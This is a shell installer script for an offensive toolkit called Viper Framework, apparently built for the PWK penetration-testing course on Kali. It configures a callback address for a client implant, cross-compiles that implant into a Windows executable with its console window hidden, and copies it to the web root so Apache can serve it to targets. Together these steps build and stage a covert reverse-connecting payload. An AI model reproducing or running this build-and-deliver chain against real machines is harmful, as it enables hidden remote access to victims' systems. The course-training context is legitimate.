# ------------------------------------------------------------
# Setup Environment
# This is the installable script to install on kali 2.0
# ------------------------------------------------------------

echo "setting permissions......"
chmod +x viper.py
chmod +x modules/handler/ViperServer.py
echo ""
echo "permissions set now read this first"
echo ""
echo "This is the instalation for Viper Framework and before you run this script make sure that you navigate 
to payloads/ViperClient.py and change the IPADDESS and PORT number that you want client to call back to. 
You will only have to run this instalation script once, we are not updating your kali but only grabing 
specific instalation items for Viper. This progam has only been tested on X86 Kali 2.0 for PWK. If you have 
not changed the ip address and port number inside ViperClient.py then hit Ctrl-T and go do that. 
Then run ./installer.sh again and proceed if you have already changed the ip addess and port number inside 
ViperClient.py press any key to continue"

echo ""
echo "Important first change this line to your own correct settings s.connect(('0.0.0.0', 8081)), 
inside payloads/ViperClient.py"
echo ""
echo ""
echo "Viper will autostart and your should scroll through the instal to see what is happening"
echo ""
echo ""

read -n 1 -s -p "Press any key to continue"

sudo apt-get update

echo "building cross compiler to compile exe files on linux for windows....."
sudo apt-get install wine winetricks
#winetricks python

#cd ~/.wine/drive_c/Python26

#Note that python26 is installed, not including pip (is used to install pyinstaller). Fortunately, newer Python versions already include pip. 
#Choose the proper version from Download Python (for me, python-2.7.10.msi) and install it on wine by:

#get python 2.7.13 or which ever you choose
#https://www.python.org/downloads/
#We will fetch it for you


echo "fetching python msi 2.7.13 for cross compiling on linux for windows x86...."


cd /home/viper-framework
wget https://www.python.org/ftp/python/2.7.13/python-2.7.13.msi

echo "Installing python msi 2.7.13 for cross compiling on linux for windows x86...."
echo "You will have to click next three or four time to install python inside wine on kali...."
echo "You will have to click next three or four time to install python inside wine on kali...."
echo "You will have to click next three or four time to install python inside wine on kali...."
#navigate to the correct directory with the python.msi inside and run command

wine msiexec /i python-2.7.13.msi /L*v log.txt


#Install PyInstaller on wine

echo "Installing Pyinstaller on wine for cross compiling...."

cd ~/.wine/drive_c/Python27
wine python.exe Scripts/pip.exe install pyinstaller
cd -

echo "Congratulations your automatic install script has finished"
echo "Everything has been taken care of you can now use viper to grab information fast"
echo "usage $> python viper.py"
echo "usage $> python viper.py"


#to Convert ViperClient.py to exe run commands below
echo "generating ViperClient.exe"

# wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py

cd payloads/
wine pyinstaller --onefile --noconsole --nowindowed ViperClient.py
rm -rf build/
rm -rf dist/
sed -i 's/console=True/console=False/g' ViperClient.spec
wine pyinstaller ViperClient.spec
cp dist/ViperClient.exe /var/www/html
cp ViperClient.py /var/www/html
rm -rf build/
rm -rf dist/
cd ../


echo "copied ViperClient.exe and ViperClient.py to /var/www/html"
echo "run start apache2 service to start your server and deliver the client"

echo "usage $> python viper.py"
echo "Viper $> handler"
echo "good luck on PWK"

# wine  wine pyinstaller ViperClient.spec
# modify ViperClient.spec
# run python ViperClient.spec and change console=True to Console=False
rm python-2.7.13.msi
rm python-2.7.13.msi.*
python viper.py


